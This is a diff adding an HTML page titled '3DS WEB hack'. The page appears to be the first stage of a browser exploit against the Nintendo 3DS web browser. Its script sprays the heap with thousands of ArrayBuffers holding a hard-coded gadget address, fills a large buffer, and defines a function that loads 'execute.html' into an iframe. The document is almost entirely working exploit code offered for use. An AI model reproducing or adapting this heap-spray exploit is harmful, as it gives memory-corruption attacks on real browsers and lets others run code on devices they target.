@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=320">
+    <title>Alert!</title>
+    <style>
+        @font-face {
+            font-family: "dot16";
+            src: url("dot16.ttf");
+        }
+        * {
+            font-style: "dot16";
+        }
+        html,body {
+            margin: 0;
+            background: #000000;
+        }
+        h1,h2,h3,h4,h5,h6,p,a,ul,li,strong {
+            margin: 0px;
+        }
+        .card {
+            background-color: #202020;
+            color: #009600;
+            width: 300px;
+            height: 180px;
+            border: 4px solid #646464;
+            border-radius: 16px;
+            margin: 8px auto;
+            font-family: "dot16";
+            padding: 4px;
+        }
+        iframe {
+            width: 200px;
+            height: 100px;
+            background: #000000;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h3>3DS WEB hack</h3>
+        <iframe src="" frameborder="0" id="frame"></iframe>
+    </div>
+    <script>
+    function objects(size, gadget){
+        obj= new ArrayBuffer(size); 
+        payloads=  new Uint32Array(obj);
+        payloads[0]=gadget;
+        payloads[1]=gadget;
+    }
+    function spray4(iter) {	
+        var x=0;
+        for(var i=0; i < iter; i++){
+               x = (i*2) % 366;
+                  objects(0x8, 0x00e14e60);
+                }
+            }
+            spray4(9000);	
+            var s=1*0x100000;
+            var obj2= new ArrayBuffer(s); 
+            var payloads2=  new Uint32Array(obj2);
+            for(var i=0; i<s/4; i++) payloads2[i]=i;
+
+            function go(){
+                var win=document.getElementById("frame");
+                win.src="execute.html";
+            }	
+    </script>
+</body>
+</html>
